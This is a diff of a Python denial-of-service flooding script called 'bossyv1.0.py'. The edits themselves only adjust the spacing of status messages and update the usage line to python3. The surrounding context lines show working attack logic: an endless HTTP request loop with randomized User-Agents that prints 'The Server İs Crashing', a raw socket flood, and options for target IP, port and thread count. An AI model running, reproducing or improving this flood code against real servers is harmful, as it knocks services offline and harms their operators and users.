@@ -71,7 +71,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94m[*] The Server İs Crashing ✓\033[0m")
+			print("\033[94m [*] The Server İs Crashing ✓\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -91,7 +91,7 @@ def down_it(item):
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91m[!] No Connection ✓ Server Maybe Down\033[0m")
+		print("\033[91m [!] No Connection ✓ Server Maybe Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 		
@@ -122,7 +122,7 @@ def usage():
 |__|__| \___||__|  |__|__||__|\_| |__|  |____||___|___|
                                                        
                                 \n
-	usage : python bossyv1.0.py [-u] [-p] [-v]
+	usage : python3 bossyv1.0.py [-u] [-p] [-v]
 	-h : help
 	-u : server ip
 	-p : port default 80
@@ -151,7 +151,6 @@ def get_parameters():
 		usage()
 	if opts.port is None:
 		port = 80
-		
 	else:
 		port = opts.port
 	if opts.turbo is None:
@@ -178,7 +177,7 @@ if __name__ == '__main__':
 		usage()
 	get_parameters()
 	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94m[*] Please Wait . . .\033[0m")
+	print("\033[94m [*] Please Wait . . .\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -187,7 +186,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91m[*] Check Server İp And Port\033[0m")
+		print("\033[91m [*] Check Server İp And Port\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
